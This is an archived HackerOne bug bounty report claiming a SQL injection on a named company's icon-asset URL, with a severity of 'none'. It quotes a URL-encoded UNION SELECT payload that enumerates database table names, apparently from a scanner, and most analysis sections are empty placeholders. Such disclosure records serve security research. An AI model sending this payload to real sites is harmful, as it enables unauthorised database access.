# sql injection vulnerablity found

## Metadata
- **Source:** HackerOne
- **Report:** 211988 | https://hackerone.com/reports/211988
- **Submitted:** 2017-03-09
- **Reporter:** bd_01
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** none
- **Vuln:** SQL Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
a Blind Text Injection Differential vulnerablity was found on your site in the url :https://www.legalrobot.com/assets/icons 

a GET request made on GET /assets/icons/?v=9wr1emhXD568%3B'%20UNION%20SELECT%208%2C%20table_name%2C%20'vega'%20FROM%20information_schema.tables%20WHERE%20table_name%20like'%25 result up in vulnerablity


## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

a Blind Text Injection Differential vulnerablity was found on your site in the url :https://www.legalrobot.com/assets/icons 

a GET request made on GET /assets/icons/?v=9wr1emhXD568%3B'%20UNION%20SELECT%208%2C%20table_name%2C%20'vega'%20FROM%20information_schema.tables%20WHERE%20table_name%20like'%25 result up in vulnerablity


</details>

---
*Analysed by Claude on 2026-05-24*
